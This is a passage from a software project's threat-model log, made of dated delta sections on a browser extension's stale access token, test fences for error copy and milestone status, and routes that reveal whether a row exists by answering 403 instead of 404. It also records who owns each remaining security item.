WIRING — which `ApiFailure` a wire answer resolves to, and that the prompt adds
no special-casing — using a `generic:<CODE>` stub deliberately.
`copy.spec.ts` proves the SENTENCES differ, against the real `messageFor`.
`apps/e2e/test/vault.e2e.spec.ts` proves what identity actually SENDS.

**The observation nobody had.** Both vault clients word these refusals from a
mapping derived out of identity's source, and neither had ever seen identity
answer one — M27 PR6 shipped saying so. The e2e case added here drives the real
ceremony and records the wire: `401 unauthorized` with no session, `401
invalid_code` for a wrong one, and `429 too_many_attempts` at the cap, with every
answer before the cap asserted to still be `invalid_code`. A derivation and an
observation are different evidence, and the defect in both clients was being
confidently wrong about this route.

**The copy fence's corpus was narrower than its claim.** `copy.spec.ts` asserted
"every service refusal is classified" while reading `apps/services/vault/src`
alone — but this origin PROXIES three identity routes, so `invalid_code`,
`unauthorized` and `too_many_attempts` are refusals it can put in front of a
user and none was in the corpus. The upstream set is now derived from the
runtime's own `PROXY_ROUTES` table, a fourth upstream turns it red, and the
premise under most exemptions ("that ceremony is not proxied here") is itself
asserted against the route table. Tokens answered by STATUS rather than by name
are a declared third category, because `mappedTokens()` reads `token === '…'`
tests and a correctly status-handled refusal was otherwise indistinguishable
from one nobody classified.

**The same fence had the same defect TWICE MORE, and the review found both.**
Neither is a behaviour change; both are the file failing the rule it enforces.

- **It could not see two codes saying the same thing.** The function feeding
  "every failure code has a sentence of its own" collected `case` LABELS and
  discarded the sentences, so the assertion was set-membership over names.
  Measured, not argued: restoring the exact defect this delta fixes — one
  sentence for both a refused code and a dead session — left the whole package
  GREEN, all 325 tests it held at that point in the branch. Two things in the file claimed otherwise: the suite is
  named "every failure code has a sentence of its own", and a case named "the
  two that share are the two that mean one thing" asserted in a COMMENT which
  pair shares and why, a fact no assertion in the file could reach.
  It now maps code to sentence, resolves fall-through groups so a deliberate
  pair is visible rather than invisible, and requires any remaining sharing to
  be declared with its reason in both directions.
- **It could not see a refusal whose token is COMPUTED.** The scan reads
  `error: '<literal>'`, so `throw new ConflictException({ error: outcome.blocked })`
  was invisible, and with it `already_waiting`, which `blockReason` RETURNS but
  which no `error:` literal anywhere spells — so it could never have appeared
  unclassified, because it could never have appeared. The answer is not a wider regex (a regex
  chasing values through variables is a parser, and the next indirection
  defeats it silently) but a declared site table: the four computed throw sites
  are DERIVED and asserted against their declared tokens both ways. What cannot
  be read is at least counted. Classifying the newly visible tokens also
  corrected a stale exemption — `already_released` was excused as unreachable
  because `rearm` is an owner control, which stopped being the whole truth once
  the grantee request path's second throw site became visible.

**Residuals, stated rather than implied.**

- **[CLOSED: §6ccc]** *An expired ACCESS TOKEN still reads as an un-paired device
  in the extension.* Unchanged by this delta and carried from §6aaa:
  `vault-screens.ts` takes a raw bearer at all eight of its call sites and never
  routes through `withSession`. Left with M44's remaining scope rather than
  moved, because it is a different package and a different mechanism.
- **[CLOSED: §6ccc]** *The extension's revocation predicate carries an unreachable
  disjunct.* Also carried from §6aaa, for the same reason.

## 6ccc. Threat-model delta — M44 PR2, the extension's stale credential (2026-08-25)

**BOTH §6bbb `[OWNER: M44]` ITEMS ARE CLOSED BY THIS DELTA**, and with them the
pair §6aaa opened. M44's recorded scope is now empty.

**A CREDENTIAL THAT COULD NOT REFRESH ITSELF.** `popup.ts` mounted the vault half
with `bearer: session.accessToken` — a value read once, at mount. The access
token lives fifteen minutes and the session thirty days, so a popup left open
across that boundary answered every action `UNAUTHENTICATED`, and `messageFor`
said "This device is no longer connected to your account … Connect it again to
continue" about a pairing that was perfectly alive. Nothing was un-paired: the
copy was false, and the remedy it named — re-pairing, which costs a step-up on
the app origin — was the most expensive one available. A control that fires
without cause is still a control reading as an outage, pointed the other way.

**THE DEFECT WAS THE TYPE, NOT THE EIGHT CALL SITES.** Every consumer of that
`string` was correct and the result was still wrong, because a `string` cannot
refresh itself. `VaultScreensDeps` now declares a CAPABILITY —
`call: <T>(fn: (bearer) => Promise<ApiResult<T>>) => Promise<ApiResult<T>>` — and
the module holds no credential at all. It cannot hold a stale one, and a ninth
call site cannot reintroduce the defect because there is nothing left there to
reintroduce it with. The ABSENCE rather than the filter, again.

**REFRESHING LIVES WHERE THE SESSION DOES.** `withSession` needs the
`PairedSession` and a refresh ROTATES it, so the capability is injected by
`popup.ts` rather than imported by the screens: calling `withSession` inside
`vault-screens` would refresh correctly and leave the popup holding the previous
session — right in storage, wrong in the tab.

**THE SAME SNAPSHOT WAS PRESENT A SECOND TIME, and a rule applied to one member
of a category is a rule half-applied.** The disconnect button closed over the
`PairedSession` its draw was given. A rotation between render and click would
have had it present a spent refresh token; `disconnect` reads that refusal as
"already gone" and forgets locally, leaving a browser that looks signed out over
a session still live on the server — the outcome `disconnect`'s own comment calls
the worst there is. Both sites now resolve the session at use.

**THE UNREACHABLE DISJUNCT IS DELETED, AND THE CLAIM IS NOW DERIVED.**
`withSession` treated a refused refresh as revocation on `UNAUTHENTICATED` **or**
`INVALID_CODE`; `POST /v1/auth/refresh` throws exactly `invalid_token`, which
this client answers as `UNAUTHENTICATED`. §6aaa named the risk exactly — "the
failure mode of a later edit is somebody making it true" — so the replacement is
not prose but a fence: `session.spec.ts` walks the refresh route out of
identity's own controller and service, drives each refusal through the REAL
`refresh()` over a transport double, and asserts every disjunct named in the
predicate is a code that measurement actually produced. The mapping is exercised
rather than mirrored, because `failureFor` is module-private and a second copy of
it would drift.

**Two fences, and they catch different things — stated because a guard at two
layers needs each test to say which layer it proves.**

- `vault-screens.spec.ts` derives from `vault-client.ts` which exports TAKE a
  bearer (so `vaultState`, which takes none, is excluded by derivation rather
  than by a hand-written exclusion that would rot), then asserts every such call
  and every runtime mention of `bearer` sits inside a `call(...)` wrapper,
  matched by parens rather than by line. The deps interface is cut out of that
  corpus WITH its reason and its own separate assertion: it is a type, erased at
  build, and the one `bearer` in it names a parameter of `call`'s signature.
- The behavioural cases prove the user-visible half: an expiry renders the vault,
  a revocation renders "no longer connected", and the two are distinguished.

Measured: a mutation that captures a bearer inside one wrapper and then reuses it
bare is caught by the FENCE and NOT by the behavioural cases, because the
captured value happens to be fresh at that moment. That is the whole argument for
having both, and it is why the fence anchors on the identifier the runtime reads.

**A surviving mutation, reported rather than tidied away.** Deleting
`rotateSession(current)` left all eleven popup cases green. That was a weak test,
not a harmless line — the rotation is load-bearing for exactly the disconnect
path above — so `popup.spec.ts` gained a case that drives a rotation through the
vault half and asserts the logout afterwards carries the ROTATED bearer. Written
against the vault half deliberately: `refreshStatus` re-renders through `show()`
and would carry the new session anyway, so a test written around it would have
passed with the line deleted, which is how this went unnoticed in the first place.

**DRIVEN IN A REAL BROWSER, and the drive cost two checks that could not fail.**
`browser-smoke.mjs` loads the PACKED extension into Chrome over CDP and now
opens the popup, ages the access token out UNDERNEATH it, and takes a vault
action. Both wrong versions are recorded because both are this milestone's own
subject:

- Seeding a bearer that was ALREADY dead proved nothing. `refreshStatus` runs at
  mount, refreshes and stores, and only then is the vault half mounted — so the
  snapshot it took was fresh. Measured: the defect, restored, still passed
  13/13. The expiry has to be a TRANSITION under an open popup, because
  `vaultMounted` guards the remount and that is precisely what stranded the
  captured value.
- Probing with the `Lock` button proved nothing either. `doLock()` renders
  "Vault locked" without reading the call's outcome, so the screen says the same
  thing whether the action succeeded or was refused. The probe is now the
  UNLOCK, whose result is rendered.

With the fix the run is 14/14 and storage afterwards holds the ROTATED token;
with the mount-time snapshot restored, both new checks go red. An earlier
mutation attempt also has to be discounted rather than counted: it failed to
compile, so the harness ran the previous artifact and its "failure" was a stale
package, not evidence.

**Residuals: none, and the row is closed.** M44 opened with three items in
§6aaa; PR1 closed one and PR2 closes the other two, so nothing is deferred out of
this delta. One trade-off is accepted rather than left implied:

- **[ACCEPTED]** *The no-snapshot fence's corpus is ONE FILE.* It reads
  `vault-screens.ts`, because that is where the defect was and where the
  capability lands. `popup.ts` now resolves the session at use in both of its own
  sites, but nothing DERIVES that — the disconnect button was found by reading,
  and is held by a behavioural case rather than by a scan. A third snapshot
  introduced elsewhere in popup context would be outside this fence's reach.
  Accepted rather than owned: widening the corpus to the whole popup context
  would flag every legitimate `bearer` parameter in the message layer, which is
  most of them, and a fence that must exempt its own corpus one entry at a time
  is a hand-list wearing a derivation's clothes. Recorded because this milestone
  has now shipped the "corpus narrower than the claim" defect twice, and the
  honest response to a bound you choose to keep is to state it.

## 6ddd. Threat-model delta — M40 PR0, the column that was allowed to say nothing (2026-08-25)

**Not a control change; no runtime code moves.** A docs-plus-one-fence PR on the
M21 PR0 shape. What changes is the fence that decides whether a recorded
security deferral still has an owner, and the docs/04 column it reads to decide.

**The mechanism being repaired.** `threat-model-residuals.spec.ts` refuses a
residual tagged `[OWNER: Mnn]` once M`nn` has shipped — debt parked on a
milestone that can no longer pay it. It derived "has shipped" from the Status
column of docs/04's queue table, and that column was free prose. A row could
therefore answer the completion question with a word that means something else,
or with the right word in a shape the scan could not read, or with nothing at
all. Four of the twenty-four did:

- M21 read `**APPROVED**, section above` and carried no lifecycle word at all.
- M24 read `**APPROVED 2026-08-21, section below.**` with PR0–PR4 all shipped.
- M27 read `**SCOPED 2026-08-22, section below.**` with every PR shipped.
- M44 read `… and the row is now complete.` — a bold run, and a sentence, in
  lower case, which the case-sensitive scan did not match. The row announced its
  own completion in the very column built to be asked, and the scan saw nothing.

**Three of those four had finished.** M24, M27 and M44 were done; only M21 was
genuinely live. So the derived completed set was `{M22, M23, M25}` against a
true six, and the anti-vacuity floor guarding that derivation
(`MIN_COMPLETED_MILESTONES`) sat at exactly 3 — on the wrong number, with no
headroom left to notice it was wrong. A residual tagged to M24, M27 or M44 would
have read as live debt indefinitely.

**The repair is TOTALITY, and it is not a better regex.** Two of the four rows
could not have been rescued by any amount of pattern quality, because the word
was not there to find: `APPROVED` and `SCOPED` are true sentences about a
milestone that has since finished. The failure was that a row was permitted to
say nothing, and no parser fixes a permission. Every row now opens its Status
cell with exactly one token from a closed vocabulary — `**PLANNED.**`,
`**IN PROGRESS.**`, `**COMPLETE.**` — as a bold run that is the token and
nothing else, with the narrative following it in the same cell. One behaviour,
one spelling: no case to get wrong, no adjective to bury it under, no position
to guess. A row carrying no token reddens by name, and each declared token must
be carried by at least one row, so a parser that quietly stopped seeing two of
the three cannot pass on the strength of the third. Which table that column
belongs to is itself asserted, against the document's own
`| # | Milestone | Status |` header — the escalations table immediately above it
has a third cell that answers "what is this blocked on", and reading a column by
index without checking which table you landed in is the narrower-input-than-claim
shape §6y names.

**The measurement, which is the part worth keeping.** Applying the rule moved
the derived completed set from three to six. None of the three newly visible
milestones owns a residual, so the stale count was unchanged at thirteen — M23
twelve, M22 one. That is the honest result: the hole was real and it was
load-bearing for the NEXT tag rather than for any tag that existed then. **M40
PR3 has since adjudicated all thirteen to ZERO** (§6ggg), which is also what
retired the pinned assertion this paragraph is about — see §6ggg on why a zero
that cannot fail is not a measurement.

**What this does NOT check, measured rather than assumed.** Nothing here can
tell that a declared status is TRUE — the same bound the `[ACCEPTED]` tag has
carried since M21 PR0. Two candidate cross-checks were built against the tree
and both were rejected on measurement rather than on taste:

- A COMPLETE row's PR-split bullets must all say SHIPPED. Seventeen of docs/04's
  forty `- **PR…` bullets carry no shipped marker of any kind, and M27's PR0,
  PR1a, PR3b, PR5 and PR6 are five of those seventeen — all five shipped.
- A PLANNED row must have no per-PR record section. Only M21, M24 and M25 use
  `#### M<nn> PR…` headings: three of the seven milestones that have shipped a
  PR. M22 and M23 carry no `####` heading whatsoever.

Either would have been a fence whose input is narrower than its claim, green for
exactly the reason it is wrong. Both rejections are recorded in the fence itself
so the next author does not pay to re-derive them.

**AND THE ROW WAS WRONG ABOUT ITSELF, FOR THE SECOND TIME.** M40's docs/04 row
said M21's eighteen residuals were invisible "because that row says APPROVED and
never gained a completion status — which is the same stale-prose defect the M23
row already records about itself." M21 has not shipped: its PR split records
PR5, documents evidence content plus the legal-hold lift ceremony, as NOT YET
SHIPPED, and no commit names it. M21's silence was therefore HONEST, and the
defect is the OPPOSITE of M23's — M23's row described a finished milestone as in
progress, and M21's described a live milestone by saying nothing. They
are live debt on a live owner and stay outside the stale count. M27 PR5 had
already struck M24 from the same sentence for a different error; a row scoping a
residual-ownership sweep has now mis-stated two of the milestones it names, which
is the argument for the sweep rather than against it. They remain a
defect on their own terms — M21's one outstanding PR does none of them — and
that is a later M40 PR, not this one. PR0 measured eighteen; PR1 re-tagged one
of them to M41, and M40 PR2 adjudicated the remaining seventeen, so the
bullet-anchored count is now ZERO. The figure is still
spelled out in several places across these documents, which is the defect this
very bullet describes and does not yet close; what changed here is only that the
grep beside it now derives the number the fence reads.

### Residuals

- **[ACCEPTED]** *The token says which stage the work is at, not that the stage
  is true.* A row can declare `**PLANNED.**` while its author quietly ships, and
  nothing mechanical here objects — the same bound `[ACCEPTED]` has always
  carried, and for the same reason: no scan distinguishes an honest label from a
  convenient one. Accepted rather than owned because both mechanisms that would
  narrow it were measured against this tree and both were narrower than the
  claim they would make, which the paragraph above records with the numbers. What
  the token does buy is that the answer is now visible in the diff and impossible
  to omit, which is the half that was missing.
- **[CLOSED: §6hhh]** *The escalations table has no resolution state, so the same
  question cannot be asked of it.* `[OWNER: E1]` carries twenty residuals and
  `[OWNER: E4]` one, and docs/04's escalation rows answer "what is this blocked
  on" rather than "what stage is this at". An escalation that clears does not
  make its residuals stale the way a shipped milestone does — the work becomes
  re-ownable rather than closed — so the milestone vocabulary is the wrong shape
  to copy across, and copying it would be the fix that looks total and is not.
  Twenty-one tags nonetheless sit behind a column that cannot report a change,
  which is a rule applied to one member of a category. This milestone's later
  PRs own deciding what the escalation half should say.
  **DECIDED AND CLOSED BY M40 PR4** (§6hhh). The escalations table gains a
  **State** cell over a closed two-word vocabulary — `**BLOCKED.**` /
  `**CLEARED.**` — and all five rows read BLOCKED today, measured rather than
  assumed. The vocabulary is deliberately NOT the milestone one, for the reason
  this bullet gives: a milestone reading COMPLETE makes a residual naming it
  STALE because the work is DONE, while an escalation reading CLEARED makes one
  SCHEDULABLE because the work can finally START and nobody has started it. Same
  mechanism, opposite meaning, so `COMPLETE` on an escalation row would claim
  the work finished when it has not begun. Two assertions follow: every
  escalation row declares a state, and no residual names an escalation whose
  blocker has CLEARED. The second is VACUOUS TODAY AND SAYS SO — with nothing
  cleared it compares `[]` against `[]`, the shape M40 PR3 had to repair one
  test away — so it ships with the repair rather than waiting to acquire the
  defect: the predicate is exercised by a synthetic bullet built from a DERIVED
  escalation id, with a negative twin on a milestone tag, and a floor asserting
  the escalation-owned residuals are really in the corpus being checked. Both
  were proved by mutation: blanking E3's cell reddens the first by row name, and
  marking E1 CLEARED reddens the second. **THE COUNTS IN THIS BULLET WERE
  ALREADY STALE WHEN IT WAS RE-READ**, which is the defect it describes happening
  to itself: E1 carries TWENTY-ONE and E4 one, so the total is TWENTY-TWO rather
  than the twenty and twenty-one written above. The numbers are left as they
  were measured, dated, and the current figure is derived by the fence instead
  of restated here.
- **[OWNER: M43]** *`STALE_OWNERS` is hand-kept, and now says so.* The blindness
  is gone — the set it checks is derived from a column that can no longer be
  silent — but the list itself is written by hand, as a register of the two
  milestones known to have finished while carrying debt. Deriving it from the
  data it checks would assert nothing, so it stays, with its reason beside it.
  That is one instance of the general shape M43 carries: several closed
  vocabularies in this repo are fenced unevenly, and what it costs to extend one
  depends on which one it is. Stated here rather than resolved, so the overlap
  between the two milestones is visible instead of silently absorbed.

## 6eee. Threat-model delta — M40 PR1, one category, one owner (2026-08-25)

**Not a control change; no runtime code moves.** M40 PR1 adjudicates the first
item of the residual sweep: a single category of existence oracle that was
recorded twice, under two owners, with nothing connecting the two records.

**The category.** A route is in it when, for a caller-supplied row id, the
handler reads the row and answers `404 not_found` when it is missing, then
consults its authorization gate, which answers `403 forbidden` when the row
exists but belongs to someone else. The two answers differ, so a stranger holding
an id learns whether it names a real row — the categorical uniform-404 rule this
document states, with a real exception under it.

**Two records, two owners, and neither reached the other.** §6e recorded the
documents half at M12 and tagged it `[OWNER: M21]`; §6vv recorded the plaid half
at M27 PR1a and tagged it `[OWNER: M41]`, whose queue row is named for the sweep.
Whoever opened either saw half the work. The M21 tag was never an argument: M21's
own scope statement excludes other services' guard surfaces, and the §6e bullet's
last clause already disagreed with its own tag by saying the real fix belongs in
the service. It is the same catch-all shape §6r names — an item assigned to
"whichever milestone next touches them", which is how an item goes uncosted.
**Both halves are now `[OWNER: M41]`**, so one grep returns the whole category.

**The category, enumerated.** Derived from the controllers and handlers rather
than hand-listed, and every member independently confirmed by a refute-by-default
pass. Eight routes, in two services, and nowhere else in the repo:

- `GET /v1/documents/:documentId`, `GET …/versions`,
  `GET …/versions/:version/content`, `POST …/versions`, `POST …/status` and
  `DELETE /v1/documents/:documentId` — six, each one a `requireLive`/`lockLive`
  that throws `NotFoundException` followed immediately by `authz.assertCan`
  throwing `ForbiddenException`.
- `POST /v1/plaid/items/:id/sync` and `DELETE /v1/plaid/items/:id` — two, the
  same shape through `requireItem` and `assertCan`.

**And nowhere else, which is the half that had never been asked.** All ten
services under `apps/services/` were swept, plus the BFF, both proxy origins, the
web app and `packages/`. `assets` carries TEN id-bearing routes among its
thirteen, and `assertCanOrNotFound` is the mechanism on nine of them — three
call it directly, and the six write routes reach it through the shared
`runCommand`; the tenth, `GET /v1/estates/:ownerUserId/assets`, is held out by a
DIFFERENT mechanism, gating on settlement stage approval before it reads and
keying on a user rather than a guessed row id, so its 403 makes no claim about
any row; `profile` gates before it reads, and where a by-id read is NOT
owner-scoped in SQL — `contacts.repo.ts` and `roles.repo.ts` both expose a
`findById(id)` that selects on the id alone — it compares ownership after the
read and answers the same uniform 404, so the exclusion is held twice over; `vault` fuses the owner into the WHERE, so "not yours" returns zero rows
and the same 404; `ai-assistant`'s authz throws `NotFoundException` outright;
`audit` has no HTTP surface at all; `identity` puts the owner predicate in the
UPDATE; `notifications` takes no per-row decision. Outside `apps/services/` there
is nothing to find, and structurally so: every surface there forwards or
collapses rather than deciding. The sweep is not a scan that cannot fail — the
same detector was run against `plaid` as a control and fired on both of its
members.

(An earlier draft of that paragraph credited `assets` with `assertCanOrNotFound`
on "all twelve of its id-bearing routes". Twelve was not its route count in
either sense — thirteen routes, ten of them id-bearing — and one helper was not
the whole answer. It is also the very error this section convicts the M41 row of
below, committed in the act of writing the conviction: a summary that names one
mechanism for everybody reads exactly like a derivation.
Re-derived from the controllers and the service rather than repaired quietly.)

**Two things the M41 queue row said that this sweep corrects.** Both were true of
the conclusion and wrong about the reason, which is the kind of error that
survives review because the answer checks out.

The row credited `settlement` to `assertCanOrNotFound`. That helper is called at
exactly **three** sites, in a service with thirty-one routes, nineteen of them
carrying a path id. What keeps the REST out is different and worth knowing:
`SettlementAdminService` takes no Cedar PEP at all — there is no
`SettlementAuthz` in its constructor — and its routes reach a uniform 404 through
`assertCaseVisible`, `administrableCaseFor` and `requireAdministeredDecedentFor`,
while others are excluded by ORDER, because `OperatorGate.assertIn` throws before
any lookup happens. A later audit that checked helper usage alone would have
found most of the service "unprotected" and been wrong about all of it. (An
earlier draft of this paragraph said "three of twenty-nine" and "the other
twenty-six"; the twenty-nine was a count of BOTH services' path-id routes,
reused as though it were settlement's own, and the twenty-six was arithmetic on
top of it. Re-derived rather than repaired quietly.)

The row also implied the edge narrows this category. It narrows it for the two
members that exist and not as a property of the edge. `apps/bff` collapses a bare
403 to `NOT_FOUND` on **two** of its six downstream clients — documents and
profile (`documents-client.ts:492` and `profile-client.ts:546`). Of the
other four, THREE — assets, identity and settlement — branch only on a 403
carrying `stepup_required`, so an unexpected bare one falls through them
unchanged. The fourth is not silent: `assistant-client.ts:211` reads a bare 403
as `DISABLED`, the master consent switch being off, so a refusal arriving there
would render as an OUTAGE rather than as a leak — a different wrong answer, not
the absence of one. The two proxy origins collapse nothing:
both return the upstream status verbatim, and the operator console maps 403 to
`FORBIDDEN` and 404 to `NOT_FOUND` as two codes with two different sentences. So
the protection is a property of two specific clients, not of the boundary, and a
future member behind either origin is browser-observable the day it appears.

### Residuals

- **[OWNER: M41]** *The edge does not uniformly narrow this category, and the
  reach recorded for it was the reach of two clients.* Neither member is
  browser-reachable today — `documents-client.ts` collapses the pair and `plaid`
  has no BFF client at all — which is why both halves are hardening rather than
  live leaks. That fact is about those two clients and not about the edge: of the
  BFF's other four clients, three branch only on a token-qualified 403 and let a
  bare one through, while `assistant-client.ts` reads a bare 403 as the assistant
  being switched OFF — so a refusal reaching it would be shown as an outage,
  which is its own defect and not a narrowing. Both proxy
  origins forward the upstream status untouched while the operator console
  renders the two answers as different codes with different copy. The sweep this
  row owns therefore has a second question inside it — not only which services
  hold the shape, but which of them sit behind a surface that would show it.
- **[OWNER: M41]** *Membership is held by a TAG, not derived from the source.*
  The eight are recorded here and in §6e and §6vv, and nothing computes them. A
  ninth route written in the same shape tomorrow joins the category and no fence
  notices, which is precisely how this one came to be recorded twice under two
  owners. Deriving it — a walk that finds a by-id read reaching an `assertCan`
  before any uniform-404 helper — belongs to the milestone that also lands the
  fix, because a derivation written here would have no failing case to prove
  itself against.
- **[OWNER: M41]** *Four assertions PIN the leaky answer, and no test asserts
  the other half.* `plaid.int.spec.ts:214` and `:218` assert that a stranger
  receives 403 on an owner's existing item id, on sync and on revoke;
  `plaid.service.spec.ts:89-90` assert the same pair at the service. A change
  collapsing them to the uniform 404 turns those four red, so they are part of
  the fix rather than evidence against it. The two OWNER 403s on the same route —
  `plaid.e2e.spec.ts:174`, which asserts the `stepup_required` body, and
  `plaid.int.spec.ts:272`, which asserts only the status — must stay GREEN, and that pair is the discriminant the fix has to preserve:
  `DELETE /v1/plaid/items/:id` answers 403 to the owner who has not stepped up,
  and must answer 404 to a stranger who HAS. No test drives a plaid ROUTE with an item id
  that never existed, and none asserts an HTTP 404 on any item route, so the
  comparison the property is ABOUT — stranger-on-a-real-id against
  anyone-on-an-unknown-id, at the wire — is never made. The miss branch itself is
  not untested: `plaid.service.spec.ts:103` asserts `NotFoundException` when the
  OWNER syncs an item they have just revoked, and a soft-deleted id reaches the
  identical `requireItem` miss (`plaid.service.ts:272-276`) that an unknown id
  would. So the BRANCH has a test and the PROPERTY does not, which is the
  distinction this residual exists to hold. Recorded on the M27 PR5 precedent (§6xx; docs/06, 2026-08-24):
  pinning today's answer is only half a specification, and the half that closes
  it is the assertion that DISCRIMINATES — here, the unknown-id arm nothing
  requests.

## 6fff. Threat-model delta — M40 PR2, an owner that was not a milestone (2026-08-26)

**Not a control change; no runtime code moves.** M40 PR2 adjudicates M21's
seventeen residuals, one at a time, and M21's tagged count goes to **zero**. Not
because the work was done: THIRTEEN of the twenty items belong to owners this PR
had to create, five are accepted on their own bounds, and two go to owners that
already existed. Seventeen bullets become TWENTY items, because two of them carried
more than one thing — ELEVEN to M46, five accepted, two to M45, ONE to E1, one to M43,
and NOTHING closed. That is 11+5+2+1+1 = 20, stated as a sum because a partition
whose parts are listed and never added is a partition nobody checked.

**THE OWNER THAT WAS NOT A MILESTONE.** §4's deferred-TB7 list gives every item it
defers an owner — JIT elevation (**E1**), session recording (**E1**), KMS grant
suspension (**E1**), the M18 alarm surface (**M23**), the legal-hold ceremony
(**M21 PR5**). Two of them named an owner called **"M21 follow-on"** — peer
approval of an operator action, and operator-assisted account recovery — and only
the first carried the full phrase **"M21 follow-on, not the minimum slice"**; the
second said just "M21 follow-on". Neither is a milestone. There is no queue row, no `OWNERS` entry, and nothing to schedule —
an item can be deferred *with an owner* and still be owed by nobody. It survived
because §4 is PROSE, outside the §6 bullet corpus the residuals fence reads, which
is exactly the blind spot §6uu records. **M46 is that owner, made real.**

**And the two documents disagreed about ONE of them.** docs/04's M21 scope
statement SWEPT four items into "(all E1 — they need real IAM)" — JIT elevation,
peer approval, session recording, KMS grant suspension — and then, in its very
next sentence, deferred: "Each of those is named with its owner in the rewritten
`docs/03` §4 TB7 block". Past tense, and quoted in the form it carried at
`71b8af7`, because M40 PR2 repairs that sentence in this same change — an earlier
draft of this paragraph quoted it in the present and added bold to an `E1` the
source never emphasised. Three of the four agree across both documents.
The fourth does not: the block it defers to says peer approval is the "M21
follow-on", not E1. One category member under two owners, with the authority
pointer running from the document that is wrong to the one that is right — the
§6eee shape, ONE PR later, between two SCOPE statements rather than two residuals. The E1 sweep is also wrong on the merits for
this member: M-of-N over the stage chain is a second-approver column and a CHECK in
settlement's own cluster, the shape that service has already shipped four times
over — enumerated with its migrations at §6b rather than recounted here — and it
needs no IAM at all.

**What decided most of the seventeen was M21's own scope statement.** It names four
deliverables and disclaims the rest by name. A residual asking M21 for something
that statement disclaims is mis-owned by the milestone's own words — no judgement
required, and the same instrument that settled §6e in PR1.

| From | Became | Why |
| --- | --- | --- |
| §6b insider+executor collusion | `M46` | M-of-N *is* peer approval, which M21 disclaims |
| §6b liveness interlock | `ACCEPTED` | identity-side concurrency; no operator platform makes it cheaper |
| §6b interim allowlist | `E1` + `M46` | one bullet, two controls, two owners — split |
| §6b intake rate limiting | `ACCEPTED` | bounded by the linked-contact gate and the one-open-case index |
| §6l best-effort notice | `ACCEPTED` | commit-then-notify is the decision, not the gap |
| §6n `email_changed` reader | `M46` | operator-assisted account recovery, which M21 disclaims |
| §6o reset path re-declined | `ACCEPTED` | a position twice declined is not debt |
| §6r route-gate fence | `M45` | a scan narrower than its claim |
| §6v duplicate of §6n | `ACCEPTED` | reduced to a cross-reference |
| §6y corpus lesson unswept | `M45` | the same scan question |
| §6z ordinary session | `M46` | the audience shipped and does not BIND — see below |
| §6z revocation notice | `M46` | the surface exists now; the notice never arrived |
| §6z allowlist reader | `M46` | **PR3 shipped without it** |
| §6aa `admin.service.ts` PEP | `M46` | needs Cedar resource types, not an operator ceremony |
| §6aa SDL vs payload unions | `M43` | two copies of one vocabulary — M43's stated form |
| §6aa allowlist row | `M46` ×3 | one bullet, THREE items; its prose owned two of them elsewhere and the third nowhere — all three are M46 |
| §6aa PERSON vs ACTION | `M46` | a real role vocabulary is the follow-on's |

**Two bullets carried more than one item, and one tag cannot dispose of three.**
§6aa's allowlist-row bullet named THREE properties and, *in its own prose*, gave
two of them owners its tag did not name — "session binding is PR3's audience;
expiry and just-in-time elevation are **E1**" — while the third, case scoping,
got none at all. It carried a single `[OWNER: M21]` tag matching none of them.
Whichever owner moved would have taken the other two with it. Both are split here, and the
split is the finding: a bullet that argues about owners inside itself is a bullet
whose tag has already stopped being the record.

**TWO CLOSURES THIS PR ALMOST SHIPPED, AND THE REVIEW KILLED.** An earlier draft
marked §6z's ordinary-session bullet and §6aa's session-binding bullet
`[CLOSED: §6bb]`, on the evidence that M21 PR3a shipped the `operator` audience
and settlement decorates routes with `@AllowSessionAudiences('operator')`. Both
closures were FALSE, and the reasoning is worth keeping because it is the cheapest
mistake in this repo to make: **the decorator's presence was read as the
decorator's behaviour.** `AllowSessionAudiences` returns
`[DEFAULT_SESSION_AUDIENCE, ...audiences]` — its parameter type
`Exclude<SessionAudience, 'account'>` forbids naming `account` precisely because
it is always included — and `CallerGuard.audiencesFor` UNIONS the route list with
the service-wide grant, with a docstring saying it "could never accidentally
narrow". Settlement binds no `ALLOWED_SESSION_AUDIENCES` at all, so the baseline
is `['account']` and a decorated route admits `account` OR `operator`. The
decorator WIDENS; it does not bind. Settlement consults `caller.audience` in no
control anywhere. Both bullets are `[OWNER: M46]` and both properties still hold.

**The evidence was in the file this PR was already editing.** docs/04's M21 PR3
bullet states the trap in its own words — "`AllowSessionAudiences` unconditionally
prepends `account` and `CallerGuard.audiencesFor` returns a union that widens and
can never narrow, so decorating a settlement route ALSO admits every ordinary
account session. `OperatorGate` stays the control." A sweep that re-reads
residuals is not the same act as re-reading the MECHANISM a residual names, and
this PR did the first while believing it had done the second. **CLOSED is the one
disposition that stops anyone looking again**, which is why it needs evidence of
BEHAVIOUR and not of a mechanism's existence.

**And a third instance of the TB7 rot, found by measurement.** §6z's allowlist
reader says "the reader is PR3". PR3 shipped. `operator.controller.ts` exposes
queue, administrable, report-provider, review, verify and evidence-read, and no
route lists allowlist membership — the CLI is still the only reader. §4 already
logs two instances of exactly this: the M18 alarm surface that "said **M21 PR3b**,
which shipped the console without it", and the legal-hold ceremony that said M21
PR4 before a re-sequence. Three records in one milestone's documentation naming a
PR that shipped past them is not three mistakes; it is what happens when the
remedy's name is a PR number rather than a condition.

**AND THE ONE MECHANISM THIS PR ADDS CAME FROM ITS OWN MUTATION HARNESS.** While
the draft still carried those two `[CLOSED: …]` tags, the harness mutated one to
`[CLOSED: §6zzz]` — a section that does not exist — and the fence STAYED GREEN,
with a test named *"a CLOSED residual cites the delta that closed it"* sitting
right there. The tags did not survive review; the defect they exposed is real and
the repair stays, exercised against the **28** `[CLOSED: …]` residuals in the
document — thirty was the figure while this PR's own two false tags were still
drafted, and it fell back to 28 when they were reverted, which is the number a
reader gets from `grep -c '^- \*\*\[CLOSED' docs/03-threat-model.md` today. It checked the SHAPE `§6[a-z]{0,3}` and never that the
section was real, and a citation pointing nowhere offers the next reader nowhere
to look just as completely as no citation does. The cited id is now checked
against the sections the parser actually found, which is the derive-don't-describe
rule the owner vocabulary already follows one test above, plus a floor so the
assertion cannot pass by there being nothing closed. **The mutation is the reason
the gap was visible at all** — the test's NAME was right and its BODY was not, and
nothing but trying to break it would have said so.

### Residuals

- **[OWNER: M45]** *Owner names are policed in §6 bullets and nowhere else.* The
  residuals fence checks that every `[OWNER: X]` names someone in a vocabulary
  derived from docs/04's tables, in both directions. §4's deferred list assigns
  owners in bold prose, in the same document, and no fence reads it — which is how
  "M21 follow-on" stood as an owner for two items from M21 PR0 (`9885362`, #109,
  2026-08-17) until this PR — nine days, and SIX milestones shipped past it: M22,
  M23, M24, M25, M27 and M44, the `**COMPLETE.**` rows in docs/04's queue table,
  which is where this fence itself reads "has this milestone shipped?". The fence
